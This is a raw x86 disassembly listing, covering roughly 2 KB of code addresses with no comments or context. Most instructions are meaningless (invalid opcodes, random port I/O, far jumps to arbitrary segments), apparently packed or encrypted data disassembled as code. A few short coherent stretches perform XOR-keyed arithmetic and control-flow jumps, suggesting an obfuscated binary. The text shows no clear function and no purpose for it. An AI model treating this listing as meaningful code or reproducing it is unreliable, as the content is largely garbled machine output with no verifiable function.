  4020d8:	xor    BYTE PTR [ecx+0x4dc48baa],cl
  4020de:	sub    dh,BYTE PTR [esi+0x3b5930a4]
  4020e4:	cmp    edi,DWORD PTR [edx+0x747a0471]
  4020ea:	pcmpgtw mm5,QWORD PTR [edi+ebx*4]
  4020ee:	inc    ecx
  4020ef:	inc    edx
  4020f0:	pop    eax
  4020f1:	in     al,0x73
  4020f3:	js     0x40212f
  4020f5:	or     edi,edi
  4020f7:	sub    ebp,ebx
  4020f9:	push   es
  4020fa:	xchg   edx,eax
  4020fb:	mov    edx,DWORD PTR [ecx+0x4f]
  4020fe:	ds scas eax,DWORD PTR es:[edi]
  402100:	pop    esi
  402101:	push   esp
  402102:	out    0xe0,eax
  402104:	xor    al,0x89
  402106:	repz out dx,al
  402108:	sahf   
  402109:	loope  0x402091
  40210b:	mov    ah,0xe3
  40210d:	jb     0x402183
  40210f:	sub    eax,0x8f84cfee
  402114:	dec    ecx
  402115:	and    edx,DWORD PTR [esi-0x652dbd4c]
  40211b:	inc    edi
  40211c:	das    
  40211d:	mov    ebx,0xae29c3b8
  402122:	fimul  WORD PTR [eax]
  402124:	mov    edx,0x6fbae6ac
  402129:	mov    al,ds:0x47e7d1f0
  40212e:	add    al,0x9b
  402130:	sub    bl,BYTE PTR [eax]
  402132:	imul   ebp,ecx,0x84019fa3
  402138:	ins    BYTE PTR es:[edi],dx
  402139:	add    BYTE PTR [edi+ebx*8+0x105fee99],ch
  402140:	pop    ebp
  402141:	adc    bh,BYTE PTR [ecx-0x72]
  402144:	lods   eax,DWORD PTR ds:[esi]
  402145:	push   0x43
  402147:	sub    eax,0x202725b
  40214c:	repnz rol BYTE PTR [ecx-0x2915b5b8],1
  402153:	nop
  402154:	jge    0x4021b5
  402156:	cmc    
  402157:	js     0x402142
  402159:	jmp    0x4fa4:0x4a1793fc
  402160:	jl     0x40215b
  402162:	rol    DWORD PTR [ebx],1
  402164:	popf   
  402165:	dec    edi
  402166:	adc    dh,BYTE PTR [esi-0x2d]
  402169:	stos   DWORD PTR es:[edi],eax
  40216a:	(bad)  
  40216b:	push   ss
  40216c:	daa    
  40216d:	push   0xffffffcc
  40216f:	adc    ebx,DWORD PTR [edx]
  402171:	mov    bl,0xf6
  402173:	push   ss
  402174:	ror    BYTE PTR [edx-0x77],1
  402177:	pop    esp
  402178:	mov    bh,0xc8
  40217a:	out    dx,al
  40217b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40217c:	lock lock add DWORD PTR [edx-0x41a17898],0xffffffdc
  402185:	bound  esp,QWORD PTR [edx-0x55]
  402188:	jb     0x40213f
  40218a:	jns    0x4021ef
  40218c:	lock test ebp,edx
  40218f:	jns    0x40212d
  402191:	mov    WORD PTR [eax],fs
  402193:	mov    bl,0x5b
  402195:	(bad)  
  402196:	bound  esi,QWORD PTR ds:[esi+0x10e99032]
  40219d:	retf   
  40219e:	jl     0x40221e
  4021a0:	xchg   ch,cl
  4021a2:	xchg   edi,eax
  4021a3:	out    dx,al
  4021a4:	pop    eax
  4021a5:	mov    esp,0xd3fa750e
  4021aa:	fs mov edx,0x12f1ab5f
  4021b0:	sahf   
  4021b1:	das    
  4021b2:	repnz (bad) 
  4021b4:	inc    ebp
  4021b5:	jb     0x402220
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	jb     0x402197
  4021ba:	add    bl,BYTE PTR [ecx]
  4021bc:	jo     0x4021d8
  4021be:	ret    
  4021bf:	cwde   
  4021c0:	div    eax
  4021c2:	(bad)  
  4021c3:	test   BYTE PTR [eax],0xf
  4021c6:	fdiv   st,st(2)
  4021c8:	das    
  4021c9:	jo     0x40220c
  4021cb:	dec    edx
  4021cc:	out    0x18,eax
  4021ce:	or     eax,DWORD PTR [eax+0x714d650]
  4021d4:	out    dx,eax
  4021d5:	push   0x37
  4021d7:	xor    eax,0xda276266
  4021dc:	aam    0x34
  4021de:	xchg   edi,eax
  4021df:	jl     0x402220
  4021e1:	aad    0xfd
  4021e3:	cmp    BYTE PTR [esp+edx*2+0x45bcaacc],0x2d
  4021eb:	int    0x12
  4021ed:	cwde   
  4021ee:	mov    cl,0xca
  4021f0:	and    BYTE PTR [ebp-0x67565cf3],dh
  4021f6:	test   al,0xe8
  4021f8:	sbb    al,0x7a
  4021fa:	bnd jbe 0x402196
  4021fd:	jl     0x402189
  4021ff:	test   al,0xf2
  402201:	sar    ch,1
  402203:	sbb    al,0xc9
  402205:	lea    esi,[ebp+0x2b5a6997]
  40220b:	xchg   edi,eax
  40220c:	push   0x6f8d959a
  402211:	gs dec ebp
  402213:	jo     0x4021a3
  402215:	ins    BYTE PTR es:[edi],dx
  402216:	jbe    0x4021a9
  402218:	popa   
  402219:	jle    0x40224f
  40221b:	in     eax,0x30
  40221d:	push   edx
  40221e:	push   ss
  40221f:	jo     0x402203
  402221:	call   0xd330f715
  402226:	int    0xe7
  402228:	cld    
  402229:	or     DWORD PTR [esi-0x256eaf5d],esi
  40222f:	(bad)  
  402230:	and    ch,BYTE PTR [eax+0x7c]
  402233:	div    BYTE PTR [edi+0x31]
  402236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402237:	mov    ah,0xe5
  402239:	mov    eax,ds:0x3aabc08e
  40223e:	sbb    BYTE PTR [ebp-0x2],bh
  402241:	adc    DWORD PTR [esi],ebp
  402243:	xor    BYTE PTR [eax],dh
  402245:	sub    DWORD PTR [esi-0x2],edi
  402248:	jmp    0x40225c
  40224a:	sbb    eax,DWORD PTR [ecx-0x2bb0fc4b]
  402250:	mov    esp,ecx
  402252:	call   0x90807469
  402257:	inc    esi
  402258:	dec    esi
  402259:	jae    0x4021db
  40225b:	pusha  
  40225c:	xchg   edi,eax
  40225d:	push   esp
  40225e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40225f:	fs mov ah,0xc4
  402262:	jo     0x402285
  402264:	sub    BYTE PTR [edx-0x4c],0x67
  402268:	popa   
  402269:	fild   QWORD PTR [eax+eiz*2-0x79]
  40226d:	mov    dl,0xe3
  40226f:	les    esp,FWORD PTR [esi+0x53]
  402272:	pause  
  402274:	ins    DWORD PTR es:[edi],dx
  402275:	sbb    al,0xf
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ecx-0x18],esi
  40229c:	stos   BYTE PTR es:[edi],al
  40229d:	ss jo  0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	inc    ecx
  4022a7:	in     al,dx
  4022a8:	ds loop 0x402260
  4022ab:	lahf   
  4022ac:	sar    BYTE PTR [edi-0x63],cl
  4022af:	rcl    DWORD PTR [edx+edi*1],1
  4022b2:	mov    al,ds:0xc25f8c6c
  4022b7:	cdq    
  4022b8:	push   esi
  4022b9:	xor    BYTE PTR ds:[eax+0x4ca7bb96],cl
  4022c0:	shl    ah,1
  4022c2:	push   es
  4022c3:	outs   dx,BYTE PTR ds:[esi]
  4022c4:	sar    BYTE PTR [ecx+0x583ab32a],cl
  4022ca:	push   esi
  4022cb:	mov    BYTE PTR [esp+ebx*4-0x72],bh
  4022cf:	xchg   ecx,eax
  4022d0:	push   ds
  4022d1:	add    BYTE PTR [esp+ecx*8-0x72],ch
  4022d5:	es enter 0x209d,0xf1
  4022da:	ds push edx
  4022dc:	popa   
  4022dd:	mov    dh,BYTE PTR [edi+0x4f]
  4022e0:	xchg   esp,eax
  4022e1:	lock mov ah,0x50
  4022e4:	in     al,0x20
  4022e6:	mov    ds,ebp
  4022e8:	pop    esp
  4022e9:	sbb    edi,DWORD PTR [esp+edi*2+0x5f]
  4022ed:	adc    eax,0x4bfbf80f
  4022f2:	jmp    0x3964:0x479a9dae
  4022f9:	push   0xec5d6f0d
  4022fe:	pop    esi
  4022ff:	mov    cl,0xef
  402301:	sti    
  402302:	add    al,0xcd
  402304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402305:	push   ds
  402306:	sahf   
  402307:	pxor   mm7,mm2
  40230a:	adc    ebp,ebp
  40230c:	sub    BYTE PTR [ebx+0x58],bh
  40230f:	ret    
  402310:	adc    al,0xc3
  402312:	and    eax,0xa4148286
  402317:	test   BYTE PTR [esi-0x50],ah
  40231a:	(bad)  
  40231b:	dec    edx
  40231c:	xchg   ebx,eax
  40231d:	icebp  
  40231e:	icebp  
  40231f:	out    dx,al
  402320:	sub    ebx,0x3f
  402323:	jae    0x4022d4
  402325:	push   esi
  402326:	and    eax,0xd93f2713
  40232b:	aam    0xfd
  40232d:	js     0x402330
  40232f:	cmp    DWORD PTR [edi+esi*8+0x10],esp
  402333:	mov    bh,BYTE PTR [edx-0x47]
  402336:	mov    ch,0x10
  402338:	jecxz  0x40237f
  40233a:	data16 scas al,BYTE PTR es:[edi]
  40233c:	mov    ah,0x27
  40233e:	adc    bh,BYTE PTR [esi+0x6d]
  402341:	push   eax
  402342:	inc    ecx
  402343:	adc    al,0xce
  402345:	and    al,0xab
  402347:	push   ds
  402348:	and    edx,DWORD PTR [ecx+eiz*1-0x1f49281]
  40234f:	repnz sub DWORD PTR [ecx-0x30],0xffffffdf
  402354:	or     BYTE PTR [ecx],ch
  402356:	cld    
  402357:	daa    
  402358:	mov    eax,0xaeca0e62
  40235d:	shr    BYTE PTR [edi-0x79382b46],0xf5
  402364:	or     dh,BYTE PTR [esi+0x5089cb26]
  40236a:	jle    0x4023bc
  40236c:	add    al,0xfc
  40236e:	cmp    eax,0x1e82005
  402373:	mov    ds,esp
  402375:	adc    al,0xd5
  402377:	pop    edi
  402378:	dec    edi
  402379:	ss lahf 
  40237b:	add    ebx,DWORD PTR ds:[eax+0x68]
  40237f:	scas   al,BYTE PTR es:[edi]
  402380:	lods   al,BYTE PTR ds:[esi]
  402381:	xchg   DWORD PTR [edx],ebp
  402383:	and    dh,BYTE PTR [eax]
  402385:	nop
  402386:	dec    esi
  402387:	adc    eax,0x409b53e4
  40238c:	sub    al,0x5e
  40238e:	fucom  st(7)
  402390:	sbb    eax,0xb8bb0b59
  402395:	sbb    ebp,DWORD PTR [ebp-0x3847fc1d]
  40239b:	test   eax,0x46228dfb
  4023a0:	int3   
  4023a1:	lea    edx,[eax]
  4023a3:	sbb    al,0x30
  4023a5:	(bad)  
  4023a6:	fwait
  4023a7:	dec    edx
  4023a8:	push   esi
  4023a9:	stos   BYTE PTR es:[edi],al
  4023aa:	cmp    eax,0xf2f147e9
  4023af:	mov    edx,0x22dacc3c
  4023b4:	sahf   
  4023b5:	shl    DWORD PTR [ecx],0xb6
  4023b8:	ins    DWORD PTR es:[edi],dx
  4023b9:	inc    eax
  4023ba:	cmp    eax,0x4b1eff4a
  4023bf:	adc    DWORD PTR [ebp+esi*4-0x99d9f94],ecx
  4023c6:	inc    edi
  4023c7:	cld    
  4023c8:	jbe    0x4023e2
  4023ca:	push   eax
  4023cb:	data16 stos BYTE PTR es:[edi],al
  4023cd:	mov    BYTE PTR ds:0xdb82871a,bl
  4023d3:	call   0x4aa6206c
  4023d8:	inc    edx
  4023d9:	add    ebx,DWORD PTR [ebx]
  4023db:	xchg   esp,eax
  4023dc:	adc    edx,DWORD PTR [esi+0x1f]
  4023df:	lock imul ecx,DWORD PTR [eax],0x92f1fddc
  4023e6:	popa   
  4023e7:	mov    bl,0xfb
  4023e9:	dec    ecx
  4023ea:	xchg   ecx,eax
  4023eb:	jecxz  0x402382
  4023ed:	sub    eax,0xa96470a1
  4023f2:	test   eax,0x297fec13
  4023f7:	stc    
  4023f8:	mov    al,0xb
  4023fa:	inc    edx
  4023fb:	and    ah,dh
  4023fd:	ins    DWORD PTR es:[edi],dx
  4023fe:	push   es
  4023ff:	add    DWORD PTR [eax+0x5b],edx
  402402:	fld    QWORD PTR [ecx-0x3637d4c]
  402408:	shr    BYTE PTR [edi+eiz*8-0x29],0x27
  40240d:	retfw  
  40240f:	jg     0x4023d7
  402411:	inc    eax
  402412:	cmp    eax,0xebcd201a
  402417:	push   ebx
  402418:	or     BYTE PTR [edx-0x10],cl
  40241b:	cmova  ecx,DWORD PTR [eax+0x60]
  40241f:	out    0x67,eax
  402421:	mov    bh,0xd0
  402423:	cmp    ah,BYTE PTR [esi-0x3b]
  402426:	in     eax,0xd7
  402428:	dec    eax
  402429:	push   es
  40242a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40242b:	cmc    
  40242c:	(bad)  
  40242e:	mov    eax,0x4ff30180
  402433:	lahf   
  402434:	add    DWORD PTR [edx],ecx
  402436:	out    dx,eax
  402437:	sbb    edx,ebp
  402439:	repz mov bh,0xf2
  40243c:	push   esp
  40243d:	pushf  
  40243e:	jge    0x40242b
  402440:	(bad)  
  402441:	ds cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  402444:	jl     0x402453
  402446:	jg     0x4023eb
  402448:	pop    ecx
  402449:	pop    es
  40244a:	nop
  40244b:	in     eax,0x47
  40244d:	add    cl,dl
  40244f:	sub    al,0x4
  402451:	imul   edi,DWORD PTR [esi-0x18],0xffffff9e
  402455:	cmp    al,0x64
  402457:	popf   
  402458:	dec    esi
  402459:	popa   
  40245a:	and    eax,0xffffffe8
  40245d:	jmp    0x74608210
  402462:	adc    bh,BYTE PTR [ecx+ebp*8]
  402465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402466:	fwait
  402467:	loop   0x4024a3
  402469:	dec    esp
  40246a:	dec    edi
  40246b:	repz imul esp,DWORD PTR [ecx-0x7f591850],0x50
  402473:	push   ecx
  402474:	dec    ebx
  402475:	scas   eax,DWORD PTR es:[edi]
  402476:	repnz rcr ch,cl
  402479:	add    DWORD PTR [edx],eax
  40247b:	or     bl,dl
  40247d:	mov    ebx,0x54762eab
  402482:	clc    
  402483:	enter  0xfa74,0x2b
  402487:	pop    esi
  402488:	(bad)  ds:0x26dcdde6
  40248e:	jns    0x4024e6
  402490:	cmp    ch,BYTE PTR [eax]
  402492:	or     dl,BYTE PTR [eax]
  402494:	sbb    eax,0x553b650
  40249a:	mov    esp,0x6afd64df
  40249f:	enter  0xd64,0x96
  4024a3:	add    BYTE PTR [esi+edi*2+0x66],ah
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x3b278c37],cl
  4024f4:	mov    ch,0x70
  4024f6:	add    BYTE PTR [eax+0x70],dh
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	jg     0x402490
  4024ff:	enter  0x4416,0x93
  402503:	push   ecx
  402504:	and    edi,DWORD PTR [ebp+0x7dd7f7b0]
  40250a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250b:	xor    dl,BYTE PTR ds:0xd1557d64
  402511:	push   es
  402512:	idiv   DWORD PTR [ebx]
  402514:	je     0x4024e5
  402516:	add    ebx,ebx
  402518:	rol    BYTE PTR [ebx+0x6bab04d2],1
  40251e:	mov    bl,0x0
  402520:	mov    bl,0xbd
  402522:	dec    ebx
  402523:	(bad)  
  402524:	ficomp WORD PTR [ecx-0x1aa86c57]
  40252a:	mov    ebx,0x6e280e6b
  40252f:	in     al,0xdf
  402531:	jle    0x40252b
  402533:	ja     0x40251a
  402535:	push   0xba1e633d
  40253a:	loope  0x402506
  40253c:	out    0xdc,al
  40253e:	jle    0x402583
  402540:	add    BYTE PTR [ebx],bl
  402542:	push   0xe9fa180c
  402547:	inc    esi
  402548:	addr16 push ebx
  40254a:	daa    
  40254b:	xchg   edi,eax
  40254c:	mul    BYTE PTR [esi+0x3a]
  40254f:	sub    BYTE PTR [ebp-0x75],bl
  402552:	adc    BYTE PTR [edx-0x709403dc],bh
  402558:	fild   QWORD PTR [ebx-0x68]
  40255b:	xchg   ecx,eax
  40255c:	xchg   ebp,eax
  40255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255e:	add    al,0xd2
  402560:	in     eax,0xee
  402562:	cwde   
  402563:	stos   BYTE PTR es:[edi],al
  402564:	xor    al,0x80
  402566:	xor    al,0xa2
  402568:	ret    0xea92
  40256b:	mov    bl,0x6c
  40256d:	push   esi
  40256e:	ret    0xa24d
  402571:	jmp    0xc7324bbd
  402576:	push   eax
  402577:	dec    esi
  402578:	ins    BYTE PTR es:[edi],dx
  402579:	add    ch,BYTE PTR [esi+0x9456ac5]
  40257f:	sub    DWORD PTR [ebp+0x26abb827],ecx
  402585:	or     ah,cl
  402587:	je     0x4025f3
  402589:	mov    eax,ds:0xd1bd4cd3
  40258e:	mov    dh,0x64
  402590:	popa   
  402591:	arpl   WORD PTR [esi],si
  402593:	gs and eax,0x6a142628
  402599:	xor    esi,esp
  40259b:	inc    DWORD PTR [ebp+0x7f0dfe41]
  4025a1:	ins    BYTE PTR es:[edi],dx
  4025a2:	add    eax,0xdb564998
  4025a7:	push   ebx
  4025a8:	test   ch,0x8b
  4025ab:	repnz fsub DWORD PTR [ebx]
  4025ae:	mov    al,ds:0xd089d398
  4025b3:	sti    
  4025b4:	dec    ebp
  4025b5:	and    ch,BYTE PTR [ebx+0x55]
  4025b8:	and    esp,DWORD PTR [edx-0x7b2668bb]
  4025be:	test   eax,0x38d82203
  4025c3:	lahf   
  4025c4:	push   edx
  4025c5:	in     al,dx
  4025c6:	mov    BYTE PTR [esi+0x57],bh
  4025c9:	call   0xda0a:0xe1a4cd91
  4025d0:	jg     0x4025ae
  4025d2:	push   es
  4025d3:	rol    dh,1
  4025d5:	sub    ch,ah
  4025d7:	shl    BYTE PTR [edx+0x27],1
  4025da:	jbe    0x402608
  4025dc:	je     0x4025b2
  4025de:	(bad)  
  4025df:	cmp    eax,0x37f64e3d
  4025e4:	push   ds
  4025e5:	aad    0x1e
  4025e7:	add    DWORD PTR [eax+ebx*4+0x43f6c9b8],eax
  4025ee:	sbb    ebp,DWORD PTR [esi+0x5d]
  4025f1:	in     al,dx
  4025f2:	std    
  4025f3:	fimul  DWORD PTR [esi-0x3152ba9d]
  4025f9:	push   es
  4025fa:	mov    al,0x2c
  4025fc:	sbb    cl,BYTE PTR [esi+0x5a]
  4025ff:	sbb    BYTE PTR [ecx-0x79],0xeb
  402603:	pop    ebx
  402604:	aad    0xda
  402606:	in     al,0x16
  402608:	pop    edi
  402609:	xchg   esi,eax
  40260a:	dec    edx
  40260b:	xor    BYTE PTR [esi-0x123d1d07],dh
  402611:	cmc    
  402612:	call   0x18d4:0x39082626
  402619:	mov    ebp,0xba2d568a
  40261e:	pop    es
  40261f:	sbb    ah,ah
  402621:	jmp    0x965d:0x611edd18
  402628:	fmul   QWORD PTR [ecx+0x43]
  40262b:	fstp   DWORD PTR ds:0xe708f4ef
  402631:	pop    ebx
  402632:	test   al,0x25
  402634:	mov    ah,0xa6
  402636:	mov    eax,ds:0x14379d5b
  40263b:	adc    BYTE PTR [eax-0x23],al
  40263e:	aad    0x4f
  402640:	push   es
  402641:	and    BYTE PTR [eax-0x80],dl
  402644:	call   0x161f:0xd1fbf55d
  40264b:	sub    ch,BYTE PTR [ecx-0x50]
  40264e:	lahf   
  40264f:	cmp    BYTE PTR [edx-0xe],dh
  402652:	xchg   edx,eax
  402653:	and    esp,DWORD PTR [edi]
  402655:	sbb    esp,DWORD PTR [esi+ecx*8+0x40]
  402659:	(bad)  
  40265a:	(bad)  
  40265c:	adc    esi,esp
  40265e:	std    
  40265f:	out    0x47,al
  402661:	das    
  402662:	loopne 0x40261a
  402664:	dec    ebx
  402665:	xlat   BYTE PTR ds:[ebx]
  402666:	sub    ecx,esp
  402668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402669:	(bad)  
  40266a:	div    DWORD PTR [ebp+eiz*4+0x2c]
  40266e:	hlt    
  40266f:	je     0x40261b
  402671:	push   es
  402672:	xchg   DWORD PTR [edx+edx*2-0x27],esp
  402676:	(bad)  
  402678:	jge    0x4026ce
  40267a:	sub    BYTE PTR [eax-0x1735f01b],0x6
  402681:	and    eax,0xd8fd92d9
  402686:	mov    eax,0x9a95a68e
  40268b:	out    0xba,eax
  40268d:	add    dl,al
  40268f:	or     ebx,ebp
  402691:	push   edi
  402692:	(bad)  
  402693:	cli    
  402694:	aaa    
  402695:	neg    BYTE PTR [edi-0x42]
  402698:	scas   al,BYTE PTR es:[edi]
  402699:	add    esi,DWORD PTR [eax+0x7bfe9d46]
  40269f:	sbb    BYTE PTR [esp+eiz*4+0x1d74c58e],0xf3
  4026a7:	xor    al,0x20
  4026a9:	int    0x40
  4026ab:	lods   al,BYTE PTR ds:[esi]
  4026ac:	xor    ch,bh
  4026ae:	data16 mov WORD PTR [ecx],cs
  4026b1:	(bad)  
  4026b2:	lea    ecx,[edi]
  4026b4:	cmp    eax,0xc8147a26
  4026b9:	xchg   BYTE PTR [ebx-0x8dd73a5],dh
  4026bf:	into   
  4026c0:	mov    BYTE PTR [esi+0x3c],dh
  4026c3:	jns    0x4026f6
  4026c5:	add    ebx,DWORD PTR [esi-0x3]
  4026c8:	xchg   ebp,eax
  4026c9:	xchg   ebp,eax
  4026ca:	(bad)  
  4026cc:	ins    DWORD PTR es:[edi],dx
  4026cd:	adc    al,0xf1
  4026cf:	into   
  4026d0:	test   eax,0x26a71dbc
  4026d5:	fcomip st,st(3)
  4026d7:	enter  0x28f2,0x1f
  4026db:	popf   
  4026dc:	ins    DWORD PTR es:[edi],dx
  4026dd:	lods   eax,DWORD PTR es:[esi]
  4026df:	shr    BYTE PTR [ebx-0x45c4fa60],cl
  4026e5:	imul   ebx,esp,0x1e9f71b8
  4026eb:	pop    eax
  4026ec:	mov    al,ds:0xf5c1df75
  4026f1:	clc    
  4026f2:	add    eax,0x2a0a713d
  4026f7:	pop    ds
  4026f8:	lods   al,BYTE PTR ds:[esi]
  4026f9:	mov    eax,0x8b6cf261
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x17888f48
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	mov    dh,0x2a
  402769:	mov    edx,0x3b71e6a1
  40276e:	dec    ecx
  40276f:	inc    ecx
  402770:	jne    0x402712
  402772:	call   0x9f07f87d
  402777:	sbb    eax,0x6a2fc690
  40277c:	add    BYTE PTR [ebp+0x45836345],0x66
  402783:	int3   
  402784:	loop   0x40270d
  402786:	pusha  
  402787:	xor    ebx,DWORD PTR [ecx]
  402789:	retf   0x5b7f
  40278c:	xor    DWORD PTR [ebp-0x4d],edx
  40278f:	dec    ebx
  402790:	push   ss
  402791:	cmp    BYTE PTR [ecx],al
  402793:	pop    eax
  402794:	fwait
  402795:	in     eax,dx
  402796:	xchg   esp,eax
  402797:	ja     0x4027ae
  402799:	cmp    eax,DWORD PTR [esi]
  40279b:	fst    DWORD PTR [edx]
  40279d:	mov    dl,0x88
  40279f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a0:	bound  edi,QWORD PTR gs:[ebx]
  4027a3:	repnz sbb BYTE PTR [edx],0x60
  4027a7:	leave  
  4027a8:	jno    0x402816
  4027aa:	bound  ebp,QWORD PTR [ebx+ebp*4]
  4027ad:	jl     0x40281c
  4027af:	push   ecx
  4027b0:	les    eax,FWORD PTR [edx]
  4027b2:	xchg   DWORD PTR [edi+0x67],eax
  4027b5:	push   ebp
  4027b6:	or     eax,0xc9573c70
  4027bb:	ror    BYTE PTR [eax+0x1e],0xe2
  4027bf:	push   ebx
  4027c0:	(bad)  
  4027c1:	mov    bl,0x55
  4027c3:	push   0xb5ae0105
  4027c8:	inc    ebx
  4027c9:	cs jecxz 0x4027a8
  4027cc:	xor    eax,0x1e35aee9
  4027d1:	stos   BYTE PTR es:[edi],al
  4027d2:	xchg   ecx,eax
  4027d3:	jmp    0xb847:0x9140b5b2
  4027da:	es mov ebp,0xba546265
  4027e0:	mov    ah,0x8d
  4027e2:	add    bh,BYTE PTR [esi-0x33fce94a]
  4027e8:	out    0x4c,eax
  4027ea:	les    ebx,FWORD PTR [edi-0x21]
  4027ed:	ss enter 0xfcdb,0x99
  4027f2:	jb     0x402784
  4027f4:	sub    cl,BYTE PTR [eax+0x73]
  4027f7:	ds add eax,0x426d27ba
  4027fd:	lods   eax,DWORD PTR ds:[esi]
  4027fe:	mov    dh,0x10
  402800:	jmp    0x1f7f:0x79fd547d
  402807:	mov    WORD PTR [edx+0x7],?
  40280a:	cmp    eax,0x78aa86cd
  40280f:	and    ch,0x5d
  402812:	fnstsw WORD PTR [esi+0x5f464202]
  402818:	push   es
  402819:	in     eax,dx
  40281a:	or     DWORD PTR [ecx-0x27b97d92],edx
  402820:	aam    0xa1
  402822:	(bad)  
  402823:	and    al,0xfa
  402825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402826:	inc    edi
  402827:	push   edx
  402828:	lahf   
  402829:	mov    edx,0x1f3b710a
  40282e:	loop   0x402882
  402830:	rcl    BYTE PTR [ebx],0x28
  402833:	je     0x402864
  402835:	xchg   ebp,eax
  402836:	(bad)  [eax]
  402838:	jno    0x402861
  40283a:	shl    DWORD PTR cs:[ecx],1
  40283d:	data16 clc 
  40283f:	les    esi,FWORD PTR [esi+0x6ded2cd3]
  402845:	adc    edi,DWORD PTR [ecx+eiz*8+0x3274138a]
  40284c:	push   ecx
  40284d:	fsub   st(0),st
  40284f:	rcl    DWORD PTR [ebx],0x66
  402852:	inc    esi
  402853:	xlat   BYTE PTR ds:[ebx]
  402854:	sbb    dh,bl
  402856:	or     DWORD PTR [esi+0x59f45292],esi
  40285c:	int3   
  40285d:	or     ebx,edi
  40285f:	sub    eax,0x7149773e
  402864:	push   cs
  402865:	lds    esi,FWORD PTR [ecx-0x55]
  402868:	sub    DWORD PTR es:[ebx],esp
  40286b:	sbb    edi,edi
  40286d:	mov    dl,0x36
  40286f:	mov    esi,0xdacdacd1
  402874:	cmp    DWORD PTR [edx+0x293b631b],edi
  40287a:	addr16 (bad) 
  40287c:	cli    
  40287d:	shl    DWORD PTR [ebx-0x5cdb9b50],0xec
  402884:	test   al,0x14
  402886:	stos   DWORD PTR es:[edi],eax
  402887:	sti    
  402888:	test   al,0xd9
  40288a:	mov    ebx,0x74a51e80
  40288f:	test   BYTE PTR [ecx-0x1a],al
  402892:	push   esi
  402893:	mov    al,0x3e
  402895:	push   ebp
  402896:	or     bh,BYTE PTR [eax+0x3d]
  402899:	in     eax,0xc
  40289b:	jmp    FWORD PTR [ecx]
  40289d:	add    bl,BYTE PTR [ebp-0x1a4ee54f]
  4028a3:	sub    al,al
  4028a5:	and    eax,DWORD PTR [eax-0x1a]
  4028a8:	inc    ecx
  4028a9:	sti    
  4028aa:	lods   eax,DWORD PTR ds:[esi]
  4028ab:	out    dx,al
  4028ac:	punpckhwd mm2,QWORD PTR [ecx-0x36f2dd59]
  4028b3:	sbb    al,0x7f
  4028b5:	adc    eax,0x59f492a5
  4028ba:	cmp    al,0xfc
  4028bc:	cmp    esi,edx
  4028be:	lahf   
  4028bf:	mov    cl,0x9e
  4028c1:	pushf  
  4028c2:	cwde   
  4028c3:	je     0x402867
  4028c5:	push   esi
  4028c6:	out    0xfb,eax
  4028c8:	xchg   esi,eax
  4028c9:	call   0xf1b9361b
  4028ce:	cmp    eax,0x334def83
  4028d3:	sar    bl,cl
  4028d5:	cs loope 0x402890
  4028d8:	ins    DWORD PTR es:[edi],dx
  4028d9:	test   bl,dh
  4028db:	ss ret 0x559d
  4028df:	xor    ah,BYTE PTR [ecx+0x41049cba]
